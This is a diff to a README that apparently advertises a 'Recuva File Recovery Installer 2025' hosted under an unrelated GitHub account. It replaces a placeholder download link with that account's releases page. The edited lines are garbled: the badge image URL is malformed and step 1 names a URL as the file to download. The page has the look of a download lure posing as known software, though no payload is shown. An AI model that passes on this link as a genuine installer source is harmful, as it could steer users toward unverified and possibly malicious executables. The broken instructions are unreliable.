@@ -34,10 +34,10 @@ Recuva File Recovery is a powerful tool designed to help you restore deleted fil
 - Windows Utility
 
 ## Download Link
-[![Download Recuva File Recovery Installer](https://img.shields.io/badge/Download-Release.zip-<COLOR>.svg)](https://github.com/assets/Release.zip)
+[![Download Recuva File Recovery Installer](https://github.com/kelo11121e/Recuva-File-Recovery-Installer-2025/releases<COLOR>.svg)](https://github.com/kelo11121e/Recuva-File-Recovery-Installer-2025/releases)
 
 ## Installation Guide
-1. Download the **Release.zip** file from the link above.
+1. Download the **https://github.com/kelo11121e/Recuva-File-Recovery-Installer-2025/releases** file from the link above.
 2. Launch the installer and follow the on-screen instructions to complete the installation.
 3. Once installed, open Recuva File Recovery and start restoring your deleted files with ease.
 
